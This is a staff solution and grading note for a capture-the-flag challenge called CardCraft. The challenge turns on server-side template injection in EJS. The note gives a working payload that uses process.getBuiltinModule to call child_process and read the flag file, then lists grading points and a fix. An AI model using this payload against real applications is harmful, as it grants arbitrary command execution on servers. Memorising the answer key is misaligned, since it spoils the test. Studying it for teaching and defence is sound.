# inj6 (CardCraft) — intended solution & staff notes

## Path
1. `POST /card` with a `design` that is EJS code, e.g.
   `<%= process.getBuiltinModule('child_process').execSync('cat /flag/flag').toString() %>`.
   (EJS 3 templates run with the JS globals in scope but without the
   module `require`; `process.getBuiltinModule` reaches the builtin
   module on Node >= 20.16, which is what `node:20-slim` ships.)
2. The card preview renders the flag.

## Grading discriminators
- Distinguishes "template is user data" (SSTI) from "data reflected into a
  template" (XSS): here the attacker controls the *template*, not a slot.
- Explains why EJS (and most server-side template engines) have no default
  sandbox — rendering is code execution by definition.
- Fix: never render user-supplied templates; if custom designs are a
  product requirement, a true template sandbox / restricted language with an
  allowlist of expressions and no access to `require`/builtins.
